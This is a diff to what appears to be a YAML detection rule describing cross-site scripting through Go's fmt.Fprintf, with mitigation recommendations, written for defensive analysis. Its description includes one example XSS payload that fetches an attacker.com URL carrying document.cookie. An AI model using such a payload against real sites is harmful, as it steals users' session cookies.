@@ -54,14 +54,14 @@ description: |
   is equivalent to `w.Write([]byte("<p>" + userInput + "</p>"))` — both write unescaped bytes.
 
   **XSS attack surface via fmt.Fprintf**:
-  - **Format string injection**: `fmt.Fprintf(w, userInput)` — if the user controls the format
+  - "**Format string injection**: `fmt.Fprintf(w, userInput)` — if the user controls the format"
     string itself, `%!` verbs can cause unexpected behavior; HTML tags execute directly.
-  - **Format argument injection**: `fmt.Fprintf(w, "<p>Hello %s</p>", name)` — attacker sets
+  - "**Format argument injection**: `fmt.Fprintf(w, \"<p>Hello %s</p>\", name)` — attacker sets"
     `name` to `<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>`.
-  - **Chained template fragments**: Building HTML by concatenating `fmt.Sprintf` results and
+  - "**Chained template fragments**: Building HTML by concatenating `fmt.Sprintf` results and"
     later writing the assembled string to the response — taint survives across the intermediate
     variable.
-  - **JSON responses with incorrect Content-Type**: `fmt.Fprintf(w, `{"user":"%s"}`, username)`
+  - "**JSON responses with incorrect Content-Type**: `fmt.Fprintf(w, `{\"user\":\"%s\"}`, username)`"
     without setting `Content-Type: application/json` — browsers sniff the content and may
     render it as HTML if the response starts with `<`.
 
@@ -74,10 +74,10 @@ description: |
   injected scripts in `text/plain` responses when served inline.
 
   **Reflected vs. Stored XSS via fmt.Fprintf**:
-  - **Reflected**: The injected value comes from the current request (query param, form field,
+  - "**Reflected**: The injected value comes from the current request (query param, form field,"
     URL segment) and is immediately written to the response. The attacker crafts a malicious
     URL and tricks the victim into clicking it.
-  - **Stored**: The value was previously stored in a database and is now retrieved and written
+  - "**Stored**: The value was previously stored in a database and is now retrieved and written"
     with `fmt.Fprintf`. All visitors to the page receive the attack payload. Taint analysis
     must track the dataflow through the database query and result scanning.
 
@@ -196,8 +196,8 @@ secure_example: |
 recommendations:
   - Replace all fmt.Fprintf/Fprintln/Fprint to ResponseWriter with html/template.Execute().
   - If fmt.Fprintf is required (e.g., simple error pages), wrap every user value with html.EscapeString().
-  - Always set Content-Type: text/html; charset=utf-8 explicitly — do not rely on auto-detection.
-  - Add X-Content-Type-Options: nosniff header to all responses to prevent MIME sniffing.
+  - "Always set Content-Type: text/html; charset=utf-8 explicitly — do not rely on auto-detection."
+  - "Add X-Content-Type-Options: nosniff header to all responses to prevent MIME sniffing."
   - Implement Content Security Policy (CSP) as defense-in-depth — script-src 'self' blocks injected inline scripts.
   - Never pass user input as the format string argument (first argument) to fmt.Fprintf.
   - Pre-compile html/template instances at startup; template.Must() panics on parse errors at startup rather than runtime.
